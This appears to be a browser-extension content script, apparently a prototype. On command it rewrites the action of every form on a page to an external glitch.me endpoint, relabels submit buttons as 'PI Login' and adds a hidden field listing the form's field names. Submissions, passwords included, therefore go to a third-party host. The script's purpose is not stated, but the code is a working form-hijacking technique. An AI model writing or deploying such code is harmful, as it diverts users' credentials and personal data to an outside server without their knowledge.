(function() {
  /**
   * Check and set a global guard variable.
   * If this content script is injected into the same page again,
   * it will do nothing next time.
   */
  if (window.hasRun) {
    return;
  }
  window.hasRun = true;

  function enable() {
    var forms = document.forms;
    var i;
    var j;
    for (i = 0; i < forms.length; i++) {
      let form = forms[i];
      
      //redirect to app
      form.action = "https://rightful-alpine-jelly.glitch.me/test";

      let btns = form.querySelectorAll("input, select, button");
      var fields = "[";
      for (j = 0; j < btns.length; j++) {
        //change submit button display text
        if (btns[j].type == "submit"){
          btns[j].innerHTML = "PI Login";
          btns[j].value = "PI Login";
        }
        
        if (btns[j].hasAttribute("name") && btns[j].type != "hidden"){
          fields = fields + btns[j].name + ",";
        }
      }
      
      fields = fields + "]";
      var input = document.createElement("input");
      input.setAttribute("type", "hidden");
      input.setAttribute("value", fields);
      form.appendChild(input);
    }
  }
  
  // for now
  function disable() {
    location.reload();
  }

  browser.runtime.onMessage.addListener((message) => {
    if (message.command === "enable") {
      enable();
    } else if (message.command === "disable") {
      disable();
    }
  });

})();